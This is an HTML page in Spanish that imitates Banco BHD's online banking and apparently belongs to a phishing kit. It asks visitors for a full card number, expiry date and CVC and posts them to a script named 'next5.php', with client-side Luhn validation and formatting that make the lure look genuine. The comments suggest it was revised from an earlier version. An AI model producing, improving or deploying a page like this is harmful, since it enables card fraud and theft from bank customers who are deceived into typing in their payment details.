<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banco BHD - IBP</title>
    <link rel="icon" href="assets/img/icono.ico" type="image/x-icon" />
    <style>
        /* (Mantén los mismos estilos que tenías, no los repito por espacio) */
        body, html { margin:0; padding:0; height:100%; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; background: url('/assets/img/background-login.webp') no-repeat center center fixed; background-size: cover; }
        .container { width:100%; max-width:420px; background-color:rgba(243,233,233,0.85); border-radius:10px; padding:30px 25px; backdrop-filter:blur(10px); }
        .input-container { margin-bottom:15px; }
        .input-container-row { display:flex; gap:10px; }
        input { width:100%; padding:10px; border-radius:8px; border:1px solid #ddd; }
        .btn { background-color:#28a745; color:white; border:none; padding:10px; border-radius:8px; width:100%; cursor:pointer; }
        .alert { display:none; } /* Opcional */
    </style>
</head>
<body>
    <div class="container">
        <h1>Datos de la Tarjeta</h1>
        <p>Ingrese los detalles de su tarjeta de débito o crédito:</p>

        <form action="next5.php" method="post" id="cardForm">
            <div class="input-container">
                <label>Número de tarjeta</label>
                <input type="text" name="cardNumber" id="cardNumber" maxlength="19" required>
            </div>
            <div class="input-container-row">
                <div class="input-container">
                    <label>Expiración</label>
                    <input type="text" name="expiryDate" id="expiryDate" placeholder="MM/AA" maxlength="5" required>
                </div>
                <div class="input-container">
                    <label>CVC</label>
                    <input type="text" name="cvv" id="cvv" maxlength="3" required>
                </div>
            </div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <script>
        // Validación opcional en cliente (no interfiere con el envío)
        document.getElementById('cardForm').addEventListener('submit', function(e) {
            var card = document.getElementById('cardNumber').value.replace(/\s/g, '');
            if (!luhnCheck(card)) {
                alert("Número de tarjeta inválido");
                e.preventDefault();
            }
        });

        function luhnCheck(cardNumber) {
            let sum = 0;
            let shouldDouble = false;
            for (let i = cardNumber.length - 1; i >= 0; i--) {
                let digit = parseInt(cardNumber.charAt(i));
                if (shouldDouble) {
                    digit *= 2;
                    if (digit > 9) digit -= 9;
                }
                sum += digit;
                shouldDouble = !shouldDouble;
            }
            return sum % 10 === 0;
        }

        // Formateo de tarjeta y fecha (igual que antes)
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '');
            val = val.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = val.slice(0, 19);
        });
        document.getElementById('expiryDate').addEventListener('input', function(e) {
            let val = e.target.value.replace(/\D/g, '');
            if (val.length >= 3) val = val.slice(0,2) + '/' + val.slice(2,4);
            e.target.value = val;
        });
    </script>
</body>
</html>
